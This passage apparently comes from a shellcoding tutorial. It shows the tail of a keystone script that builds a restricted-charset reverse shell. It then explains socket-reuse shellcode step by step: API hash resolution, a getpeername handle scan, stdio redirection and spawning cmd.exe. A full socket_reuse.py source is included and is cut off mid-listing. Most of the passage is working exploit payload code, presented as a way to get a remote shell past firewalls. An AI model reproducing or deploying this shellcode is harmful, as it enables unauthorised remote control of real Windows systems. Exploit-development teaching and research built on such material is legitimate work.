    "   neg   cl                        ;"  #   CL = 0x08
    "   xor   eax, eax                  ;"
    "   mov   ax, 0x6578                ;"  #   "xe"
    "   shl   eax, cl                   ;"
    "   mov   al, 0x65                  ;"  #   "exe\0"
    "   push  eax                       ;"
    "   push  0x2e646d63                ;"  #   "cmd."
    "   mov   edi, esp                  ;"
    "   xor   eax, eax                  ;"
    "   push  ebx                       ;"  #   lpProcessInformation
    "   push  esi                       ;"  #   lpStartupInfo
    "   push  eax                       ;"
    "   push  eax                       ;"
    "   push  eax                       ;"
    "   inc   eax                       ;"
    "   push  eax                       ;"  #   bInheritHandles = TRUE
    "   dec   eax                       ;"
    "   push  eax                       ;"
    "   push  eax                       ;"
    "   push  edi                       ;"  #   "cmd.exe"
    "   push  eax                       ;"
    "   call  dword ptr [ebp+0x14]      ;"  #   CreateProcessA

    " call_WaitForSingleObject:          "
    "   xor   eax, eax                  ;"
    "   mov   eax, 0xFFFFFFFF           ;"  #   INFINITE
    "   push  eax                       ;"
    "   push  dword ptr [ebx]           ;"  #   pi.hProcess
    "   call  dword ptr [ebp+0x18]      ;"  #   WaitForSingleObject

    " call_ExitProcess:                  "
    "   xor   eax, eax                  ;"
    "   push  eax                       ;"
    "   call  dword ptr [ebp+0x1C]      ;"  #   ExitProcess(0)
)

ks = Ks(KS_ARCH_X86, KS_MODE_32)
encoding, count = ks.asm(CODE)
print("Encoded %d instructions..." % count)

shellcode = bytes(encoding)
shellcode_str = ''.join(f'\\x{b:02x}' for b in shellcode)
print(f"[+] Generated Shellcode: {shellcode_str}")
print(f"[+] Shellcode length: {len(shellcode)} bytes")
```

### PoC Video

The following video demonstrates the restricted-charset reverse shell executing successfully despite heavy bad character filtering:

<div align="center">
  <video width="720" controls>
    <source src="/assets/video/shellcoding/restricted-charset-poc.mp4" type="video/mp4">
    Your browser does not support the video tag.
  </video>
</div>

*Video: Restricted-charset shellcode executing cleanly*

---
## 13. Socket Reuse: Hijacking Existing Connections

Every shellcode technique so far creates a *new* network connection. **Socket reuse** sidesteps that by hijacking the very TCP socket the exploit already opened. No new connections, no new firewall rules to bypass -- the shell traffic rides inside the existing connection.

This technique is invaluable when firewalls block all new outbound AND inbound connections. Since the exploit already established a TCP connection to deliver the payload, we simply find and reuse that socket handle.

### Step 1: Resolving kernel32.dll Functions

Three standard functions from `kernel32.dll`:

**LoadLibraryA** Hash: `0xec0e4e8e`. Loads ws2_32.dll.

**CreateProcessA** Hash: `0x16b3fe72`. Spawns cmd.exe.

**ExitProcess** Hash: `0x73e2d87e`. Clean exit.

```nasm
resolve_symbols_kernel32:
    push  0xec0e4e8e              ; LoadLibraryA hash
    call  dword ptr [ebp+0x04]
    mov   [ebp+0x10], eax

    push  0x16b3fe72              ; CreateProcessA hash
    call  dword ptr [ebp+0x04]
    mov   [ebp+0x14], eax

    push  0x73e2d87e              ; ExitProcess hash
    call  dword ptr [ebp+0x04]
    mov   [ebp+0x18], eax
```

<div align="center"><svg viewBox="0 0 750 100" width="750" xmlns="http://www.w3.org/2000/svg" style="font-family: 'Segoe UI', Consolas, monospace;">
  <defs>
    <linearGradient id="bg_s1303" x1="0" y1="0" x2="1" y2="1"><stop offset="0%" stop-color="#0a0e17"/><stop offset="100%" stop-color="#111827"/></linearGradient>
    <filter id="glow_s1303"><feGaussianBlur stdDeviation="2" result="blur"/><feMerge><feMergeNode in="blur"/><feMergeNode in="SourceGraphic"/></feMerge></filter>
    <linearGradient id="line_s1303" x1="0" y1="0" x2="1" y2="0"><stop offset="0%" stop-color="#00d4ff" stop-opacity="0"/><stop offset="50%" stop-color="#00ff88" stop-opacity="0.5"/><stop offset="100%" stop-color="#00d4ff" stop-opacity="0"/></linearGradient>
  </defs>
  <rect width="750" height="100" rx="10" fill="url(#bg_s1303)"/>
  <rect x="50" y="2" width="650" height="1" rx="1" fill="url(#line_s1303)"/>
  <text x="375" y="28" text-anchor="middle" fill="#e0e7ff" font-size="14" filter="url(#glow_s1303)" font-weight="bold">kernel32.dll API Resolution (Split ROR-13)</text>
  <rect x="50" y="48" width="200" height="35" rx="5" fill="#151b28" stroke="#00d4ff" stroke-width="1.5"/>
  <text x="150" y="70" text-anchor="middle" fill="#00d4ff" font-size="11">LoadLibraryA → [ebp+0x10]</text>
  <rect x="275" y="48" width="210" height="35" rx="5" fill="#151b28" stroke="#ff6b35" stroke-width="1.5"/>
  <text x="380" y="70" text-anchor="middle" fill="#ff6b35" font-size="11">CreateProcessA → [ebp+0x14]</text>
  <rect x="510" y="48" width="200" height="35" rx="5" fill="#151b28" stroke="#ff3366" stroke-width="1.5"/>
  <text x="610" y="70" text-anchor="middle" fill="#ff3366" font-size="11">ExitProcess → [ebp+0x18]</text>
</svg></div>

*Figure 13.a -- Three kernel32 APIs resolved via split ROR-13 (ror 7 + ror 6).*

### Step 2: Loading ws2_32.dll and Resolving getpeername

The key function here is `getpeername` -- it retrieves the remote address of a connected socket. We use it to identify which handle belongs to the exploit's connection:

**WSAStartup** Hash: `0x3bfcedcb`. Init Winsock.

**WSASocketA** Hash: `0xadf509d9`. Not used for creating a socket here, but resolved for completeness.

**getpeername** `int getpeername(SOCKET s, struct sockaddr *name, int *namelen)` Returns the remote address of a connected socket. If the handle is not a socket, the call fails. Hash: `0x95066ef2`.

```nasm
resolve_symbols_ws2_32_dll:
    mov   ebx, eax                ; EBX = ws2_32.dll base
    push  0x3bfcedcb              ; WSAStartup hash
    call  dword ptr [ebp+0x04]
    mov   [ebp+0x1C], eax

    push  0xadf509d9              ; WSASocketA hash
    call  dword ptr [ebp+0x04]
    mov   [ebp+0x20], eax

    push  0x95066ef2              ; getpeername hash
    call  dword ptr [ebp+0x04]
    mov   [ebp+0x24], eax         ; save getpeername
```

<div align="center"><svg viewBox="0 0 750 100" width="750" xmlns="http://www.w3.org/2000/svg" style="font-family: 'Segoe UI', Consolas, monospace;">
  <defs>
    <linearGradient id="bg_s1304" x1="0" y1="0" x2="1" y2="1"><stop offset="0%" stop-color="#0a0e17"/><stop offset="100%" stop-color="#111827"/></linearGradient>
    <filter id="glow_s1304"><feGaussianBlur stdDeviation="2" result="blur"/><feMerge><feMergeNode in="blur"/><feMergeNode in="SourceGraphic"/></feMerge></filter>
    <linearGradient id="line_s1304" x1="0" y1="0" x2="1" y2="0"><stop offset="0%" stop-color="#00d4ff" stop-opacity="0"/><stop offset="50%" stop-color="#00ff88" stop-opacity="0.5"/><stop offset="100%" stop-color="#00d4ff" stop-opacity="0"/></linearGradient>
  </defs>
  <rect width="750" height="100" rx="10" fill="url(#bg_s1304)"/>
  <rect x="50" y="2" width="650" height="1" rx="1" fill="url(#line_s1304)"/>
  <text x="375" y="28" text-anchor="middle" fill="#e0e7ff" font-size="14" filter="url(#glow_s1304)" font-weight="bold">ws2_32.dll API Resolution</text>
  <rect x="50" y="48" width="200" height="35" rx="5" fill="#151b28" stroke="#00d4ff" stroke-width="1.5"/>
  <text x="150" y="70" text-anchor="middle" fill="#00d4ff" font-size="11">WSAStartup → [ebp+0x1C]</text>
  <rect x="275" y="48" width="200" height="35" rx="5" fill="#151b28" stroke="#8b949e" stroke-width="1"/>
  <text x="375" y="70" text-anchor="middle" fill="#8b949e" font-size="11">WSASocketA → [ebp+0x20]</text>
  <rect x="500" y="48" width="210" height="35" rx="5" fill="#151b28" stroke="#ff3366" stroke-width="2"/>
  <text x="605" y="70" text-anchor="middle" fill="#ff3366" font-size="11" font-weight="bold">getpeername → [ebp+0x24]</text>
</svg></div>

*Figure 13.b -- ws2_32.dll APIs resolved. getpeername is the key function for socket identification.*

### Step 3: Handle Scanning Setup

We allocate a `sockaddr_in` structure on the stack and initialize the scan at handle `0x50`:

```nasm
struct_sockaddr_in:
    xor   eax, eax
    mov   al, 0x10                ; 16 bytes
    sub   esp, eax                ; allocate sockaddr_in
    mov   [ebp+0x28], esp         ; save &sockaddr_in
    xor   eax, eax
    mov   [ebp+0x2C], eax         ; SOCK = 0 (will be set to 0x50)
    mov   dword ptr [ebp+0x2C], 0x50  ; start scanning at handle 0x50
    jmp   call_getpeername        ; jump into the loop
```

<div align="center"><svg viewBox="0 0 750 110" width="750" xmlns="http://www.w3.org/2000/svg" style="font-family: 'Segoe UI', Consolas, monospace;">
  <defs>
    <linearGradient id="bg_s1305" x1="0" y1="0" x2="1" y2="1"><stop offset="0%" stop-color="#0a0e17"/><stop offset="100%" stop-color="#111827"/></linearGradient>
    <filter id="glow_s1305"><feGaussianBlur stdDeviation="2" result="blur"/><feMerge><feMergeNode in="blur"/><feMergeNode in="SourceGraphic"/></feMerge></filter>
    <linearGradient id="line_s1305" x1="0" y1="0" x2="1" y2="0"><stop offset="0%" stop-color="#00d4ff" stop-opacity="0"/><stop offset="50%" stop-color="#00ff88" stop-opacity="0.5"/><stop offset="100%" stop-color="#00d4ff" stop-opacity="0"/></linearGradient>
  </defs>
  <rect width="750" height="110" rx="10" fill="url(#bg_s1305)"/>
  <rect x="50" y="2" width="650" height="1" rx="1" fill="url(#line_s1305)"/>
  <text x="375" y="28" text-anchor="middle" fill="#e0e7ff" font-size="14" filter="url(#glow_s1305)" font-weight="bold">sockaddr_in Allocation &amp; Scan Init</text>
  <rect x="50" y="48" width="210" height="40" rx="5" fill="#151b28" stroke="#00d4ff" stroke-width="1.5"/>
  <text x="155" y="64" text-anchor="middle" fill="#00d4ff" font-size="11" font-weight="bold">16-byte struct</text>
  <text x="155" y="80" text-anchor="middle" fill="#e0e7ff" font-size="10">[ebp+0x28] = &sockaddr_in</text>
  <rect x="290" y="48" width="180" height="40" rx="5" fill="#151b28" stroke="#ff6b35" stroke-width="1.5"/>
  <text x="380" y="64" text-anchor="middle" fill="#ff6b35" font-size="11" font-weight="bold">Start Handle</text>
  <text x="380" y="80" text-anchor="middle" fill="#e0e7ff" font-size="10">[ebp+0x2C] = 0x50</text>
  <rect x="500" y="48" width="200" height="40" rx="5" fill="#151b28" stroke="#8b949e" stroke-width="1" stroke-dasharray="4,3"/>
  <text x="600" y="64" text-anchor="middle" fill="#8b949e" font-size="11">Scan Range</text>
  <text x="600" y="80" text-anchor="middle" fill="#8b949e" font-size="10">0x50 → 0x400 (step 4)</text>
</svg></div>

*Figure 13.c -- Scan setup: sockaddr_in allocated on stack, handle scan starts at 0x50.*

> Windows handle values start low. Socket handles from `WSASocketA` or `accept` typically land in the `0x50`-`0x400` range. We start at `0x50` and increment by 4 (handles are always DWORD-aligned).

### Step 4: The Handle Enumeration Loop

This is the core of socket reuse -- a brute-force loop that tests every handle with `getpeername`:

```nasm
loop_handle:
    add   dword ptr [ebp+0x2C], 0x04   ; next handle (+4)
    cmp   dword ptr [ebp+0x2C], 0x400  ; past maximum?
    jl    call_getpeername              ; no: keep scanning
    jmp   call_ExitProcess              ; yes: bail out (no socket found)

call_getpeername:
    xor   eax, eax
    mov   al, 0x10                ; namelen = 16
    push  eax                     ; push namelen (on stack as value)
    mov   eax, esp                ; EAX = &namelen
    push  eax                     ; arg 3: &namelen
    push  dword ptr [ebp+0x28]   ; arg 2: &sockaddr_in
    push  dword ptr [ebp+0x2C]   ; arg 1: handle candidate
    call  dword ptr [ebp+0x24]   ; getpeername(handle, &addr, &len)
    pop   ecx                     ; clean namelen off stack

    ; Check 1: did getpeername succeed?
    xor   edx, edx
    cmp   edx, eax                ; return == 0?
    jnz   loop_handle             ; failed -> not a socket, try next

    ; Check 2: does the port match?
    xor   eax, eax
    mov   ax, 0x5C11              ; port 4444 in network byte order
    mov   edi, [ebp+0x28]         ; EDI = &sockaddr_in
    cmp   word ptr [edi+0x02], ax ; sin_port == 4444?
    jnz   loop_handle             ; wrong port, try next
    ; MATCH! [ebp+0x2C] holds our socket handle
```

<div align="center"><svg viewBox="0 0 750 300" width="750" xmlns="http://www.w3.org/2000/svg" style="font-family: 'Segoe UI', Consolas, monospace;">
  <defs>
    <linearGradient id="bg_s1301" x1="0" y1="0" x2="1" y2="1"><stop offset="0%" stop-color="#0a0e17"/><stop offset="100%" stop-color="#111827"/></linearGradient>
    <filter id="glow_s1301"><feGaussianBlur stdDeviation="2" result="blur"/><feMerge><feMergeNode in="blur"/><feMergeNode in="SourceGraphic"/></feMerge></filter>
    <linearGradient id="line_s1301" x1="0" y1="0" x2="1" y2="0"><stop offset="0%" stop-color="#00d4ff" stop-opacity="0"/><stop offset="50%" stop-color="#00ff88" stop-opacity="0.5"/><stop offset="100%" stop-color="#00d4ff" stop-opacity="0"/></linearGradient>
    <marker id="arr_s1301" markerWidth="10" markerHeight="7" refX="10" refY="3.5" orient="auto"><polygon points="0 0, 10 3.5, 0 7" fill="#00ff88"/></marker>
  </defs>
  <rect width="750" height="300" rx="10" fill="url(#bg_s1301)"/>
  <rect x="50" y="2" width="650" height="1" rx="1" fill="url(#line_s1301)"/>
  <text x="375" y="28" text-anchor="middle" fill="#e0e7ff" font-size="15" filter="url(#glow_s1301)" font-weight="bold">Handle Brute-Force Scan</text>
  <text x="375" y="50" text-anchor="middle" fill="#8b949e" font-size="11">Testing handle values 0x50 to 0x400 (step 4)</text>
  <rect x="35" y="68" width="65" height="40" rx="6" fill="#151b28" stroke="#ff3366" stroke-width="1.5"/>
  <text x="67" y="84" text-anchor="middle" fill="#e0e7ff" font-size="10">0x50</text>
  <text x="67" y="100" text-anchor="middle" fill="#ff3366" font-size="12" font-weight="bold">X</text>
  <rect x="110" y="68" width="65" height="40" rx="6" fill="#151b28" stroke="#ff3366" stroke-width="1.5"/>
  <text x="142" y="84" text-anchor="middle" fill="#e0e7ff" font-size="10">0x54</text>
  <text x="142" y="100" text-anchor="middle" fill="#ff3366" font-size="12" font-weight="bold">X</text>
  <rect x="185" y="68" width="65" height="40" rx="6" fill="#151b28" stroke="#ff3366" stroke-width="1.5"/>
  <text x="217" y="84" text-anchor="middle" fill="#e0e7ff" font-size="10">0x58</text>
  <text x="217" y="100" text-anchor="middle" fill="#ff3366" font-size="12" font-weight="bold">X</text>
  <rect x="260" y="68" width="65" height="40" rx="6" fill="#151b28" stroke="#8b949e" stroke-width="1" stroke-dasharray="4,3"/>
  <text x="292" y="92" text-anchor="middle" fill="#8b949e" font-size="14">...</text>
  <rect x="335" y="68" width="65" height="40" rx="6" fill="#151b28" stroke="#ff6b35" stroke-width="2"/>
  <text x="367" y="84" text-anchor="middle" fill="#e0e7ff" font-size="10">0xA0</text>
  <text x="367" y="100" text-anchor="middle" fill="#ff6b35" font-size="12" font-weight="bold">?</text>
  <rect x="410" y="68" width="65" height="40" rx="6" fill="#151b28" stroke="#00ff88" stroke-width="2"/>
  <text x="442" y="84" text-anchor="middle" fill="#e0e7ff" font-size="10">0xA4</text>
  <text x="442" y="100" text-anchor="middle" fill="#00ff88" font-size="14" font-weight="bold">V</text>
  <rect x="485" y="68" width="65" height="40" rx="6" fill="#151b28" stroke="#8b949e" stroke-width="1" stroke-dasharray="4,3"/>
  <text x="517" y="92" text-anchor="middle" fill="#8b949e" font-size="14">...</text>
  <rect x="560" y="68" width="80" height="40" rx="6" fill="#151b28" stroke="#8b949e" stroke-width="1"/>
  <text x="600" y="84" text-anchor="middle" fill="#8b949e" font-size="10">0x400</text>
  <text x="600" y="100" text-anchor="middle" fill="#8b949e" font-size="10">end</text>
  <rect x="80" y="128" width="590" height="48" rx="6" fill="#151b28" stroke="#00d4ff" stroke-width="1.5"/>
  <text x="185" y="148" text-anchor="middle" fill="#ff3366" font-size="11">X = getpeername() failed (not a socket)</text>
  <text x="430" y="148" text-anchor="middle" fill="#ff6b35" font-size="11">? = socket but wrong port</text>
  <text x="475" y="168" text-anchor="middle" fill="#00ff88" font-size="11" font-weight="bold">V = port 4444 match! Use this handle.</text>
  <rect x="100" y="195" width="550" height="90" rx="6" fill="#151b28" stroke="#00ff88" stroke-width="2"/>
  <text x="375" y="218" text-anchor="middle" fill="#00ff88" font-size="12" font-weight="bold">Two-Stage Validation</text>
  <text x="375" y="242" text-anchor="middle" fill="#e0e7ff" font-size="11">1. getpeername() returns 0 -> handle IS a connected socket</text>
  <text x="375" y="262" text-anchor="middle" fill="#e0e7ff" font-size="11">2. sockaddr_in.sin_port == 0x5C11 -> socket IS our exploit connection</text>
  <text x="375" y="278" text-anchor="middle" fill="#8b949e" font-size="10">Handle stored at [ebp+0x2C] becomes the stdio redirect target</text>
</svg></div>

*Figure 13.1 -- Handle brute-force scan. Each handle is tested with getpeername(): if it fails, it's not a socket. If it succeeds but the port doesn't match, it's the wrong connection. When both pass, we found our socket.*

### Step 5: STARTUPINFOA with Reused Socket

Once we find the matching handle at `[ebp+0x2C]`, we use `rep stosb` to zero the STARTUPINFOA structure and redirect stdio to the reused socket:

```nasm
zero_structs:
    xor   eax, eax
    xor   ecx, ecx
    mov   cl, 0x44                ; 68 bytes
    sub   esp, ecx
    mov   edi, esp
    push  ecx
    rep   stosb                   ; zero fill
    pop   ecx
    sub   edi, ecx

struct_STARTUPINFOA:
    xor   edx, edx
    mov   dx, 0x0101
    dec   edx                     ; 0x0100 = STARTF_USESTDHANDLES
    xor   eax, eax
    mov   eax, [ebp+0x2C]        ; the found socket handle!
    mov   [edi+0x40], eax         ; hStdError  = reused socket
    mov   [edi+0x3C], eax         ; hStdOutput = reused socket
    mov   [edi+0x38], eax         ; hStdInput  = reused socket
    mov   [edi+0x2C], edx         ; dwFlags = 0x0100
    mov   dword ptr [edi], ecx    ; cb = 0x44
    xor   esi, esi
    xchg  esi, edi                ; ESI = &STARTUPINFOA
```

<div align="center"><svg viewBox="0 0 750 140" width="750" xmlns="http://www.w3.org/2000/svg" style="font-family: 'Segoe UI', Consolas, monospace;">
  <defs>
    <linearGradient id="bg_s1306" x1="0" y1="0" x2="1" y2="1"><stop offset="0%" stop-color="#0a0e17"/><stop offset="100%" stop-color="#111827"/></linearGradient>
    <filter id="glow_s1306"><feGaussianBlur stdDeviation="2" result="blur"/><feMerge><feMergeNode in="blur"/><feMergeNode in="SourceGraphic"/></feMerge></filter>
    <linearGradient id="line_s1306" x1="0" y1="0" x2="1" y2="0"><stop offset="0%" stop-color="#00d4ff" stop-opacity="0"/><stop offset="50%" stop-color="#00ff88" stop-opacity="0.5"/><stop offset="100%" stop-color="#00d4ff" stop-opacity="0"/></linearGradient>
  </defs>
  <rect width="750" height="140" rx="10" fill="url(#bg_s1306)"/>
  <rect x="50" y="2" width="650" height="1" rx="1" fill="url(#line_s1306)"/>
  <text x="375" y="28" text-anchor="middle" fill="#e0e7ff" font-size="14" filter="url(#glow_s1306)" font-weight="bold">STARTUPINFOA Redirect stdio to Reused Socket</text>
  <rect x="50" y="48" width="200" height="35" rx="5" fill="#151b28" stroke="#00ff88" stroke-width="1.5"/>
  <text x="150" y="70" text-anchor="middle" fill="#00ff88" font-size="10">hStdInput = socket</text>
  <rect x="275" y="48" width="200" height="35" rx="5" fill="#151b28" stroke="#00ff88" stroke-width="1.5"/>
  <text x="375" y="70" text-anchor="middle" fill="#00ff88" font-size="10">hStdOutput = socket</text>
  <rect x="500" y="48" width="200" height="35" rx="5" fill="#151b28" stroke="#00ff88" stroke-width="1.5"/>
  <text x="600" y="70" text-anchor="middle" fill="#00ff88" font-size="10">hStdError = socket</text>
  <rect x="50" y="98" width="340" height="30" rx="4" fill="#151b28" stroke="#ff6b35" stroke-width="1.5"/>
  <text x="220" y="118" text-anchor="middle" fill="#ff6b35" font-size="10">dwFlags = STARTF_USESTDHANDLES (0x100)</text>
  <rect x="410" y="98" width="300" height="30" rx="4" fill="#151b28" stroke="#8b949e" stroke-width="1"/>
  <text x="560" y="118" text-anchor="middle" fill="#8b949e" font-size="10">cb = 0x44 (68 bytes), zeroed with rep stosb</text>
</svg></div>

*Figure 13.d -- STARTUPINFOA redirects all three stdio handles to the reused socket handle from [ebp+0x2C].*

### Step 6: CreateProcessA and ExitProcess

The remainder is identical to the bind shell -- zero PROCESS_INFORMATION, build "cmd.exe", call CreateProcessA, then ExitProcess:

```nasm
call_CreateProcessA:
    ; ... zero pi, build "cmd.exe" on stack ...
    xor   eax, eax
    push  edi                     ; lpProcessInformation
    push  esi                     ; lpStartupInfo
    push  eax                     ; lpCurrentDirectory
    push  eax                     ; lpEnvironment
    push  eax                     ; dwCreationFlags
    inc   eax
    push  eax                     ; bInheritHandles = TRUE
    dec   eax
    push  eax                     ; lpThreadAttributes
    push  eax                     ; lpProcessAttributes
    push  edx                     ; lpCommandLine = "cmd.exe"
    push  eax                     ; lpApplicationName
    call  dword ptr [ebp+0x14]    ; CreateProcessA

call_ExitProcess:
    xor   eax, eax
    push  eax
    call  dword ptr [ebp+0x18]    ; ExitProcess(0)
```

<div align="center"><svg viewBox="0 0 750 100" width="750" xmlns="http://www.w3.org/2000/svg" style="font-family: 'Segoe UI', Consolas, monospace;">
  <defs>
    <linearGradient id="bg_s1307" x1="0" y1="0" x2="1" y2="1"><stop offset="0%" stop-color="#0a0e17"/><stop offset="100%" stop-color="#111827"/></linearGradient>
    <filter id="glow_s1307"><feGaussianBlur stdDeviation="2" result="blur"/><feMerge><feMergeNode in="blur"/><feMergeNode in="SourceGraphic"/></feMerge></filter>
    <linearGradient id="line_s1307" x1="0" y1="0" x2="1" y2="0"><stop offset="0%" stop-color="#00d4ff" stop-opacity="0"/><stop offset="50%" stop-color="#00ff88" stop-opacity="0.5"/><stop offset="100%" stop-color="#00d4ff" stop-opacity="0"/></linearGradient>
  </defs>
  <rect width="750" height="100" rx="10" fill="url(#bg_s1307)"/>
  <rect x="50" y="2" width="650" height="1" rx="1" fill="url(#line_s1307)"/>
  <text x="375" y="28" text-anchor="middle" fill="#e0e7ff" font-size="14" filter="url(#glow_s1307)" font-weight="bold">CreateProcessA + ExitProcess</text>
  <rect x="50" y="48" width="450" height="35" rx="5" fill="#151b28" stroke="#ff3366" stroke-width="2"/>
  <text x="275" y="70" text-anchor="middle" fill="#ff3366" font-size="11" font-weight="bold">CreateProcessA("cmd.exe", ..., bInheritHandles=TRUE)</text>
  <rect x="520" y="48" width="190" height="35" rx="5" fill="#151b28" stroke="#8b949e" stroke-width="1"/>
  <text x="615" y="70" text-anchor="middle" fill="#8b949e" font-size="11">ExitProcess(0)</text>
</svg></div>

*Figure 13.e -- cmd.exe spawned inheriting the reused socket handle, then clean exit.*

### Complete Socket Reuse Flow

<div align="center"><svg viewBox="0 0 750 200" width="750" xmlns="http://www.w3.org/2000/svg" style="font-family: 'Segoe UI', Consolas, monospace;">
  <defs>
    <linearGradient id="bg_s1302" x1="0" y1="0" x2="1" y2="1"><stop offset="0%" stop-color="#0a0e17"/><stop offset="100%" stop-color="#111827"/></linearGradient>
    <filter id="glow_s1302"><feGaussianBlur stdDeviation="2" result="blur"/><feMerge><feMergeNode in="blur"/><feMergeNode in="SourceGraphic"/></feMerge></filter>
    <linearGradient id="line_s1302" x1="0" y1="0" x2="1" y2="0"><stop offset="0%" stop-color="#00d4ff" stop-opacity="0"/><stop offset="50%" stop-color="#00ff88" stop-opacity="0.5"/><stop offset="100%" stop-color="#00d4ff" stop-opacity="0"/></linearGradient>
    <marker id="arr_s1302" markerWidth="10" markerHeight="7" refX="10" refY="3.5" orient="auto"><polygon points="0 0, 10 3.5, 0 7" fill="#00ff88"/></marker>
  </defs>
  <rect width="750" height="200" rx="10" fill="url(#bg_s1302)"/>
  <rect x="50" y="2" width="650" height="1" rx="1" fill="url(#line_s1302)"/>
  <text x="375" y="28" text-anchor="middle" fill="#e0e7ff" font-size="15" filter="url(#glow_s1302)" font-weight="bold">Socket Reuse Pipeline</text>
  <rect x="10" y="50" width="100" height="45" rx="5" fill="#151b28" stroke="#00d4ff" stroke-width="1.5"/>
  <text x="60" y="68" text-anchor="middle" fill="#00d4ff" font-size="9" font-weight="bold">Resolve APIs</text>
  <text x="60" y="82" text-anchor="middle" fill="#e0e7ff" font-size="8">k32 + ws2_32</text>
  <line x1="110" y1="72" x2="125" y2="72" stroke="#00ff88" stroke-width="1.5" marker-end="url(#arr_s1302)"/>
  <rect x="130" y="50" width="100" height="45" rx="5" fill="#151b28" stroke="#ff6b35" stroke-width="1.5"/>
  <text x="180" y="68" text-anchor="middle" fill="#ff6b35" font-size="9" font-weight="bold">Init scan</text>
  <text x="180" y="82" text-anchor="middle" fill="#e0e7ff" font-size="8">handle = 0x50</text>
  <line x1="230" y1="72" x2="245" y2="72" stroke="#00ff88" stroke-width="1.5" marker-end="url(#arr_s1302)"/>
  <rect x="250" y="50" width="130" height="45" rx="5" fill="#151b28" stroke="#ff3366" stroke-width="2"/>
  <text x="315" y="68" text-anchor="middle" fill="#ff3366" font-size="9" font-weight="bold">getpeername loop</text>
  <text x="315" y="82" text-anchor="middle" fill="#e0e7ff" font-size="8">scan 0x50..0x400</text>
  <line x1="380" y1="72" x2="395" y2="72" stroke="#00ff88" stroke-width="1.5" marker-end="url(#arr_s1302)"/>
  <rect x="400" y="50" width="110" height="45" rx="5" fill="#151b28" stroke="#00ff88" stroke-width="1.5"/>
  <text x="455" y="68" text-anchor="middle" fill="#00ff88" font-size="9" font-weight="bold">Port match</text>
  <text x="455" y="82" text-anchor="middle" fill="#e0e7ff" font-size="8">sin_port=4444</text>
  <line x1="510" y1="72" x2="525" y2="72" stroke="#00ff88" stroke-width="1.5" marker-end="url(#arr_s1302)"/>
  <rect x="530" y="50" width="200" height="45" rx="5" fill="#151b28" stroke="#00ff88" stroke-width="2"/>
  <text x="630" y="68" text-anchor="middle" fill="#00ff88" font-size="9" font-weight="bold">CreateProcessA</text>
  <text x="630" y="82" text-anchor="middle" fill="#e0e7ff" font-size="8">stdio = found socket</text>
  <rect x="50" y="115" width="650" height="65" rx="6" fill="#151b28" stroke="#8b949e" stroke-width="1" stroke-dasharray="4,3"/>
  <text x="375" y="138" text-anchor="middle" fill="#e0e7ff" font-size="12" font-weight="bold">Zero New Connections</text>
  <text x="375" y="158" text-anchor="middle" fill="#e0e7ff" font-size="11">The exploit opens a socket -> delivers shellcode -> shellcode finds THAT socket -> reuses it</text>
  <text x="375" y="174" text-anchor="middle" fill="#8b949e" font-size="10">Firewall sees only the original connection. No new ports, no new connections.</text>
</svg></div>

*Figure 13.2 -- Socket reuse creates zero new network connections. The shell rides inside the exploit's own TCP session.*

### Full Shellcode Source (`socket_reuse.py`)

```python
import ctypes, struct
from keystone import *

CODE = (
    " start:                             "
    "   mov   ebp, esp                  ;"
    "   add   esp, 0xfffff9f0           ;"  #   Avoid NULL bytes

    " find_kernel32:                     "
    "   xor   ecx, ecx                  ;"  #   ECX = 0
    "   mov   esi,fs:[ecx+0x30]         ;"  #   ESI = &(PEB) ([FS:0x30])
    "   mov   esi,[esi+0x0C]            ;"  #   ESI = PEB->Ldr
    "   mov   esi,[esi+0x1C]            ;"  #   ESI = PEB->Ldr.InInitOrder

    " next_module:                       "
    "   mov   ebx, [esi+0x08]           ;"  #   EBX = InInitOrder[X].base_address
    "   mov   edi, [esi+0x20]           ;"  #   EDI = InInitOrder[X].module_name
    "   mov   esi, [esi]                ;"  #   ESI = InInitOrder[X].flink (next)
    "   cmp   [edi+12*2], cx            ;"  #   modulename[12] == 0x00?
    "   jne   next_module               ;"

    " find_function_shorten:             "
    "   jmp find_function_shorten_bnc   ;"

    " find_function_ret:                 "
    "   pop esi                         ;"
    "   mov   [ebp+0x04], esi           ;"
    "   jmp resolve_symbols_kernel32    ;"

    " find_function_shorten_bnc:         "
    "   call find_function_ret          ;"

    " find_function:                     "
    "   pushad                          ;"
    "   mov   eax, [ebx+0x3c]           ;"
    "   mov   edi, [ebx+eax+0x78]       ;"
    "   add   edi, ebx                  ;"
    "   mov   ecx, [edi+0x18]           ;"
    "   mov   eax, [edi+0x20]           ;"
    "   add   eax, ebx                  ;"
    "   mov   [ebp-4], eax              ;"

    " find_function_loop:                "
    "   jecxz find_function_finished    ;"
    "   dec   ecx                       ;"
    "   mov   eax, [ebp-4]              ;"
    "   mov   esi, [eax+ecx*4]          ;"
    "   add   esi, ebx                  ;"

    " compute_hash:                      "
    "   xor   eax, eax                  ;"
    "   cdq                             ;"
    "   cld                             ;"

    " compute_hash_again:                "
    "   lodsb                           ;"
    "   test  al, al                    ;"
    "   jz    compute_hash_finished     ;"
    "   ror   edx, 0x07                 ;"  #   7 + 6 = 13
    "   ror   edx, 0x06                 ;"
    "   add   edx, eax                  ;"
    "   jmp   compute_hash_again        ;"

    " compute_hash_finished:             "

    " find_function_compare:             "
    "   cmp   edx, [esp+0x24]           ;"
    "   jnz   find_function_loop        ;"
    "   mov   edx, [edi+0x24]           ;"
    "   add   edx, ebx                  ;"
    "   mov   cx,  [edx+2*ecx]          ;"
    "   mov   edx, [edi+0x1c]           ;"
    "   add   edx, ebx                  ;"
    "   mov   eax, [edx+4*ecx]          ;"
    "   add   eax, ebx                  ;"
    "   mov   [esp+0x1c], eax           ;"

    " find_function_finished:            "
    "   popad                           ;"
    "   ret                             ;"

    " resolve_symbols_kernel32:          "
    "   push  0xec0e4e8e                ;"  #   LoadLibraryA
    "   call dword ptr [ebp+0x04]       ;"
    "   mov   [ebp+0x10], eax           ;"
    "   push  0x16b3fe72                ;"  #   CreateProcessA
    "   call dword ptr [ebp+0x04]       ;"
    "   mov   [ebp+0x14], eax           ;"
    "   push  0x73e2d87e                ;"  #   ExitProcess
    "   call dword ptr [ebp+0x04]       ;"
    "   mov   [ebp+0x18], eax           ;"

    " load_ws2_32_dll:                   "
    "   xor   eax, eax                  ;"
    "   push  eax                       ;"
    "   xor   eax, eax                  ;"
    "   mov   ax, 0x6c6c                ;"
    "   push  eax                       ;"
    "   push  0x642e3233                ;"
    "   push  0x5f327377                ;"
    "   mov   esi, esp                  ;"
    "   push  esi                       ;"
    "   call  dword ptr [ebp+0x10]      ;"  #   LoadLibraryA("ws2_32.dll")

    " resolve_symbols_ws2_32_dll:        "
